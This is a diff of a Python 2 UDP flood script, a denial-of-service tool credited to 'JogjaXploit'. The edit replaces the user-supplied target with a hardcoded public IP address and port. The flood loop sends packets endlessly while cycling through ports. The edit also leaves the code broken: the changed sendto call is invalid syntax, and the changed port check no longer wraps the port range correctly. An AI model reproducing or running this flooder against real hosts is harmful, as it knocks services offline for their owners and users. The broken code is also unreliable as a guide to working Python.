@@ -25,8 +25,8 @@ print "TEAM     : JogjaXploit"
 print "Thanks   : All Member JogjaXploit "
 print "Tingkat  : Newbie Galau"
 print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+ip = raw_input("20.248.206.238: ")
+port = input("7777: ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
@@ -42,9 +42,9 @@ print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
+     sock.sendto(bytes, (20.248.206.238:7777))
      sent = sent + 1
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
+     if port == 7777:
        port = 1
